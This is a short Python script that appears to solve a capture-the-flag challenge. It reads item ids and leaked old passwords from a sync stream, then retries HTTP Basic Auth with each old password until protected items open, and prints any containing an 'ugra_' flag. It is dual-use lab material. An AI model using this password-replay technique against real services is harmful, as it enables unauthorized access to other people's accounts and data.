from collections import deque
import sys
import json

import requests
from requests.auth import HTTPBasicAuth

url = input('url: ')
token = input('token: ')


queue = deque()
password_queue = deque()
last_pwd = ''

basic = HTTPBasicAuth(token, 'password')
with requests.get(f"{url}/sync/{token}/", stream=True) as sync:
    sync.raise_for_status()
    for line in sync.iter_lines():
        value = json.loads(line)
        queue.append(value['id'])
        password_queue.append(value['old_password'])
        print(value)
        while queue:
            elem = queue[0]
            r = requests.get(f"{url}/{token}/{elem}", auth=basic)
            while password_queue and r.status_code == 401:
                basic = HTTPBasicAuth(token, password_queue.popleft())
                r = requests.get(f"{url}/{token}/{elem}", auth=basic)
            if r.status_code == 200:
                queue.popleft()
                text = r.text
                if 'ugra_' in text:
                    print(text)
            elif r.status_code in (401, 404):
                break
            else:
                print(r.status_code, r.text)
                sys.exit(1)

